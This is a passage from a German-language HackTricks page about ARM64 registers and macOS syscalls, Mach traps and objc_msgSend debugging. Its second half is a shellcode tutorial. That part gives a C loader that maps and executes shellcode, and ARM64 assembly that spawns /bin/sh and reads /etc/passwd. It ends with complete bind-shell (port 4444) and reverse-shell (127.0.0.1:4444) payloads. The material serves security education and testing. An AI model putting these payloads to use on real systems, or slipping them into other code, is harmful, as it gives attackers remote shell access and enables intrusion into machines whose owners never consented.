Zum Beispiel addiert die **`UADD8`** Anweisung **vier Byte-Paare** (von zwei 32-Bit-Operanden) parallel und speichert die Ergebnisse in einem 32-Bit-Register. Sie **setzt dann die `GE` Flags im `APSR`** basierend auf diesen Ergebnissen. Jedes GE-Flag entspricht einer der Byte-Addition, die angibt, ob die Addition für dieses Byte-Paar **übergelaufen** ist.

Die **`SEL`** Anweisung verwendet diese GE-Flags, um bedingte Aktionen auszuführen.

#### Ausführungsstatusregister

- Die **`J`** und **`T`** Bits: **`J`** sollte 0 sein und wenn **`T`** 0 ist, wird der Befehlssatz A32 verwendet, und wenn er 1 ist, wird T32 verwendet.
- **IT Block Status Register** (`ITSTATE`): Dies sind die Bits von 10-15 und 25-26. Sie speichern Bedingungen für Anweisungen innerhalb einer **`IT`**-präfixierten Gruppe.
- **`E`** Bit: Gibt die **Endianness** an.
- **Mode und Ausnahme-Maskenbits** (0-4): Sie bestimmen den aktuellen Ausführungsstatus. Das **5.** gibt an, ob das Programm als 32-Bit (eine 1) oder 64-Bit (eine 0) läuft. Die anderen 4 repräsentieren den **aktuell verwendeten Ausnahme-Modus** (wenn eine Ausnahme auftritt und behandelt wird). Die gesetzte Zahl **gibt die aktuelle Priorität** an, falls eine andere Ausnahme ausgelöst wird, während diese behandelt wird.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Bestimmte Ausnahmen können mit den Bits **`A`**, `I`, `F` deaktiviert werden. Wenn **`A`** 1 ist, bedeutet das, dass **asynchrone Abbrüche** ausgelöst werden. Das **`I`** konfiguriert die Reaktion auf externe Hardware **Interrupts Requests** (IRQs). und das F bezieht sich auf **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Schau dir [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) an. BSD syscalls haben **x16 > 0**.

### Mach Traps

Schau dir in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) die `mach_trap_table` und in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) die Prototypen an. Die maximale Anzahl der Mach-Traps ist `MACH_TRAP_TABLE_COUNT` = 128. Mach-Traps haben **x16 < 0**, also musst du die Zahlen aus der vorherigen Liste mit einem **Minus** aufrufen: **`_kernelrpc_mach_vm_allocate_trap`** ist **`-10`**.

Du kannst auch **`libsystem_kernel.dylib`** in einem Disassembler überprüfen, um herauszufinden, wie man diese (und BSD) syscalls aufruft:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Beachten Sie, dass **Ida** und **Ghidra** auch **spezifische dylibs** aus dem Cache dekompilieren können, indem sie einfach den Cache übergeben.

> [!TIP]
> Manchmal ist es einfacher, den **dekompilierten** Code von **`libsystem_kernel.dylib`** **zu überprüfen**, als den **Quellcode** zu überprüfen, da der Code mehrerer Syscalls (BSD und Mach) über Skripte generiert wird (siehe Kommentare im Quellcode), während Sie in der dylib finden können, was aufgerufen wird.

### machdep-Aufrufe

XNU unterstützt einen weiteren Typ von Aufrufen, die maschinenabhängig sind. Die Anzahl dieser Aufrufe hängt von der Architektur ab, und weder die Aufrufe noch die Zahlen sind garantiert konstant.

### comm-Seite

Dies ist eine vom Kernel verwaltete Speicherseite, die in den Adressraum jedes Benutzerprozesses gemappt ist. Sie soll den Übergang vom Benutzermodus in den Kernelraum schneller machen als die Verwendung von Syscalls für Kernel-Dienste, die so häufig verwendet werden, dass dieser Übergang sehr ineffizient wäre.

Zum Beispiel liest der Aufruf `gettimeofdate` den Wert von `timeval` direkt von der comm-Seite.

### objc_msgSend

Es ist sehr häufig, diese Funktion in Objective-C- oder Swift-Programmen zu finden. Diese Funktion ermöglicht es, eine Methode eines Objective-C-Objekts aufzurufen.

Parameter ([weitere Informationen in den Dokumenten](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Zeiger auf die Instanz
- x1: op -> Selektor der Methode
- x2... -> Rest der Argumente der aufgerufenen Methode

Wenn Sie also einen Haltepunkt vor dem Sprung zu dieser Funktion setzen, können Sie leicht herausfinden, was in lldb aufgerufen wird (in diesem Beispiel ruft das Objekt ein Objekt von `NSConcreteTask` auf, das einen Befehl ausführen wird):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Das Setzen der Umgebungsvariable **`NSObjCMessageLoggingEnabled=1`** ermöglicht es, zu protokollieren, wann diese Funktion in einer Datei wie `/tmp/msgSends-pid` aufgerufen wird.
>
> Darüber hinaus kann durch das Setzen von **`OBJC_HELP=1`** und das Aufrufen einer beliebigen Binärdatei andere Umgebungsvariablen angezeigt werden, die verwendet werden können, um **log** zu protokollieren, wann bestimmte Objc-C-Aktionen auftreten.

Wenn diese Funktion aufgerufen wird, ist es notwendig, die aufgerufene Methode der angegebenen Instanz zu finden. Dazu werden verschiedene Suchen durchgeführt:

- Führen Sie eine optimistische Cache-Suche durch:
- Wenn erfolgreich, erledigt
- Erwerben Sie runtimeLock (lesen)
- Wenn (realize && !cls->realized) Klasse realisieren
- Wenn (initialize && !cls->initialized) Klasse initialisieren
- Versuchen Sie den eigenen Cache der Klasse:
- Wenn erfolgreich, erledigt
- Versuchen Sie die Methodenliste der Klasse:
- Wenn gefunden, Cache füllen und erledigt
- Versuchen Sie den Cache der Superklasse:
- Wenn erfolgreich, erledigt
- Versuchen Sie die Methodenliste der Superklasse:
- Wenn gefunden, Cache füllen und erledigt
- Wenn (resolver) versuchen Sie den Methodenresolver und wiederholen Sie die Suche von der Klassensuche
- Wenn Sie immer noch hier sind (= alles andere ist fehlgeschlagen) versuchen Sie den Forwarder

### Shellcodes

Um zu kompilieren:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Um die Bytes zu extrahieren:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Für neuere macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C-Code zum Testen des Shellcodes</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Entnommen von [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) und erklärt.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="mit Stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="mit adr für linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Mit cat lesen

Das Ziel ist es, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen, sodass das zweite Argument (x1) ein Array von Parametern ist (was im Speicher einen Stack der Adressen bedeutet).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Befehl mit sh aus einem Fork aufrufen, damit der Hauptprozess nicht beendet wird
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind-Shell

Bind-Shell von [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) in **Port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse Shell

Von [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell zu **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
